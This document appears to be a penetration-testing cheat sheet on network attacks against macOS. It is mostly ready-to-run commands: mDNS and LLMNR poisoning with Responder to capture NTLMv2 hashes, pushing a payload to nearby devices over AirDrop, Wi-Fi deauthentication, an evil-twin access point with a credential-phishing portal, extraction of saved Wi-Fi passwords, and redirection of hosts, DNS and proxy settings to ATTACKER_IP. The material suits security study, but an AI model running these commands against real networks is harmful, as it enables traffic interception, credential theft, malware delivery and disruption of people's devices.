# macOS Network Attacks

Network-based attacks specific to the macOS ecosystem.

---

## 1. mDNS / Bonjour Exploitation

macOS heavily uses mDNS (Multicast DNS) for service discovery via Bonjour.

### Enumerate Bonjour Services
```bash
# List all advertised services on the local network
dns-sd -B _services._dns-sd._udp local.

# Browse specific service types
dns-sd -B _http._tcp local.          # Web servers
dns-sd -B _smb._tcp local.           # SMB shares
dns-sd -B _ssh._tcp local.           # SSH servers
dns-sd -B _afpovertcp._tcp local.    # AFP shares
dns-sd -B _rfb._tcp local.           # VNC/Screen Sharing
dns-sd -B _airplay._tcp local.       # AirPlay devices
dns-sd -B _raop._tcp local.          # AirPlay audio
dns-sd -B _printer._tcp local.       # Printers
dns-sd -B _ipp._tcp local.           # IPP printers

# Resolve a specific service
dns-sd -L "MacBook Pro" _http._tcp local.
```

### mDNS Poisoning
```bash
# Respond to mDNS queries with attacker-controlled IPs
# Tool: Responder (works on macOS networks too)
python3 Responder.py -I en0 -A

# Or use dns-sd to register a malicious service
dns-sd -R "File Server" _smb._tcp local. 445 path=/share
```

---

## 2. AirDrop Abuse

### AWDL (Apple Wireless Direct Link) Sniffing
```bash
# AirDrop uses AWDL for device discovery and file transfer
# Monitor AWDL interface (requires disabling Wi-Fi first on some setups)

# Check if AWDL is active
ifconfig awdl0

# Enable AWDL monitoring
sudo tcpdump -i awdl0 -w awdl_capture.pcap

# Discover nearby AirDrop-enabled devices
# Tool: opendrop (https://github.com/seemoo-lab/opendrop)
opendrop find

# Send unsolicited files (if target has AirDrop set to "Everyone")
opendrop send -f /path/to/payload.app -r target_device
```

### AirDrop Hash Harvesting
```bash
# When AirDrop is set to "Contacts Only," the device broadcasts
# a truncated SHA-256 hash of the user's phone number/email
# This can be used to identify the device owner
# Tool: apple_bleee (https://github.com/hexway/apple_bleee)
```

---

## 3. Wi-Fi Attacks

### Deauthentication
```bash
# macOS can be put into monitor mode (limited support)
sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 sniff 6

# For deauth attacks, use an external Wi-Fi adapter with monitor mode
# Tool: aireplay-ng
aireplay-ng -0 10 -a <BSSID> -c <CLIENT_MAC> wlan0mon
```

### Evil Twin / Rogue AP
```bash
# Create a rogue access point matching target network
# macOS users auto-connect to known SSIDs

# Using hostapd:
# hostapd.conf
# interface=wlan0
# driver=nl80211
# ssid=TARGET_NETWORK
# channel=6
# hw_mode=g

# Captive portal for credential capture
# Redirect HTTP to a phishing page
```

### Extract Saved Wi-Fi Credentials
```bash
# List saved networks
networksetup -listpreferredwirelessnetworks en0

# Get password (requires admin)
security find-generic-password -D "AirPort network password" -s "SSID_NAME" -w
```

---

## 4. Bluetooth Attacks

```bash
# Enumerate Bluetooth devices
system_profiler SPBluetoothDataType

# Check Bluetooth status
defaults read /Library/Preferences/com.apple.Bluetooth ControllerPowerState

# Bluetooth Low Energy scanning
# Tool: blueutil (brew install blueutil)
blueutil --paired
blueutil --inquiry

# Bluetooth keyboard injection (if discoverable)
# Tool: MouseJack (for wireless peripherals using nRF24L01)
```

---

## 5. DNS Spoofing / Local DNS Manipulation

```bash
# Modify /etc/hosts for local DNS override (requires root)
sudo sh -c 'echo "ATTACKER_IP target-app.internal.corp" >> /etc/hosts'

# Flush DNS cache to apply immediately
sudo dscacheutil -flushcache
sudo killall -HUP mDNSResponder

# Set DNS server (via networksetup)
sudo networksetup -setdnsservers "Wi-Fi" ATTACKER_DNS_IP

# Check current DNS
scutil --dns | grep "nameserver"
```

---

## 6. Proxy Manipulation

```bash
# Set system proxy (affects apps that respect system proxy)
sudo networksetup -setwebproxy "Wi-Fi" ATTACKER_IP 8080
sudo networksetup -setsecurewebproxy "Wi-Fi" ATTACKER_IP 8080

# Auto-proxy URL (PAC file)
sudo networksetup -setautoproxyurl "Wi-Fi" "http://ATTACKER_IP/proxy.pac"

# Check current proxy
networksetup -getwebproxy "Wi-Fi"
networksetup -getsecurewebproxy "Wi-Fi"
networksetup -getautoproxyurl "Wi-Fi"

# Remove proxy (cleanup)
sudo networksetup -setwebproxystate "Wi-Fi" off
sudo networksetup -setsecurewebproxystate "Wi-Fi" off
```

---

## 7. LLMNR / mDNS Poisoning

```bash
# macOS resolves names in this order:
# 1. /etc/hosts
# 2. DNS
# 3. mDNS (.local domains)
# 4. LLMNR (if configured)

# Responder captures NTLMv2 hashes from macOS machines
# connecting to SMB shares or WPAD
python3 Responder.py -I en0 -wrf

# macOS specific: mDNS takes precedence for .local domains
# Register a malicious .local name
dns-sd -R "fileserver" _smb._tcp local. 445
```

---

## 8. Handoff / Continuity Exploitation

```bash
# Handoff uses BLE advertisements + Wi-Fi for data transfer
# Between devices signed into the same iCloud account

# Monitor Handoff BLE advertisements
# These contain activity type and application info
# Tool: PacketLogger (Apple's Bluetooth diagnostic tool)

# Universal Clipboard: copy on one device, paste on another
# If you compromise one Apple device, clipboard content from
# all devices on the same iCloud account is accessible
```

---

## Tools

| Tool | Purpose |
|------|---------|
| Responder | LLMNR/mDNS/WPAD poisoning, hash capture |
| opendrop | AirDrop interaction (find/send) |
| Bettercap | Network attacks framework (MITM, sniffing) |
| Wireshark | Packet capture and analysis |
| tcpdump | CLI packet capture |
| dns-sd | mDNS/Bonjour service browsing |
| airport | Wi-Fi scanning utility |
